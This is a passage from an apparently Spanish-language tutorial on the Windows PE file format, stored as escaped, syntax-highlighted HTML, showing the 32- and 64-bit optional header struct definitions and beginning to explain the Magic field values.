&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 Magic&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;BYTE&lt;&#x2F;span&gt;                 MajorLinkerVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;BYTE&lt;&#x2F;span&gt;                 MinorLinkerVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfCode&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfInitializedData&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfUninitializedData&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                AddressOfEntryPoint&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                BaseOfCode&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                BaseOfData&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                ImageBase&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SectionAlignment&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                FileAlignment&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MajorOperatingSystemVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MinorOperatingSystemVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MajorImageVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MinorImageVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MajorSubsystemVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MinorSubsystemVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                Win32VersionValue&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfImage&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfHeaders&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                CheckSum&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 Subsystem&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 DllCharacteristics&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfStackReserve&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfStackCommit&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfHeapReserve&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfHeapCommit&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                LoaderFlags&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                NumberOfRvaAndSizes&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  IMAGE_DATA_DIRECTORY DataDirectory&lt;span class=&quot;z-meta z-brackets z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c&quot;&gt;[&lt;&#x2F;span&gt;IMAGE_NUMBEROF_DIRECTORY_ENTRIES&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; IMAGE_OPTIONAL_HEADER32&lt;span class=&quot;z-punctuation z-separator z-c&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-type z-typedef z-c&quot;&gt;PIMAGE_OPTIONAL_HEADER32&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;typedef&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;struct&lt;&#x2F;span&gt; _IMAGE_OPTIONAL_HEADER64 &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-double-slash z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-c&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt; 64 bits
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 Magic&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-c&quot;&gt;=&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;BYTE&lt;&#x2F;span&gt;                 MajorLinkerVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;BYTE&lt;&#x2F;span&gt;                 MinorLinkerVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfCode&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-c&quot;&gt;=&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfInitializedData&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfUninitializedData&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                AddressOfEntryPoint&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                BaseOfCode&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-c&quot;&gt;=&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;ULONGLONG&lt;&#x2F;span&gt;            ImageBase&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-c&quot;&gt;=&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SectionAlignment&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                FileAlignment&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MajorOperatingSystemVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-c&quot;&gt;=&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MinorOperatingSystemVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-c&quot;&gt;=&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MajorImageVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MinorImageVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MajorSubsystemVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 MinorSubsystemVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                Win32VersionValue&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfImage&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-c&quot;&gt;=&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                SizeOfHeaders&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                CheckSum&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 Subsystem&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;                 DllCharacteristics&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;ULONGLONG&lt;&#x2F;span&gt;            SizeOfStackReserve&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;ULONGLONG&lt;&#x2F;span&gt;            SizeOfStackCommit&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;ULONGLONG&lt;&#x2F;span&gt;            SizeOfHeapReserve&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;ULONGLONG&lt;&#x2F;span&gt;            SizeOfHeapCommit&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                LoaderFlags&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                NumberOfRvaAndSizes&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  IMAGE_DATA_DIRECTORY DataDirectory&lt;span class=&quot;z-meta z-brackets z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c&quot;&gt;[&lt;&#x2F;span&gt;IMAGE_NUMBEROF_DIRECTORY_ENTRIES&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-c&quot;&gt;=&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; IMAGE_OPTIONAL_HEADER64&lt;span class=&quot;z-punctuation z-separator z-c&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-type z-typedef z-c&quot;&gt;PIMAGE_OPTIONAL_HEADER64&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El encabezado opcional contiene una gran cantidad de información útil. A continuación se presentan algunos de los miembros de la estructura que se utilizan comúnmente:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Magic&lt;&#x2F;strong&gt; – Describe el estado del archivo de imagen (imagen de 32 o 64 bits).&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;0x10B&lt;&#x2F;code&gt;:&lt;&#x2F;strong&gt; Identifica la imagen como ejecutable &lt;code&gt;PE32&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;0x20B&lt;&#x2F;code&gt;:&lt;&#x2F;strong&gt; Identifica la imagen como ejecutable &lt;code&gt;PE32+&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
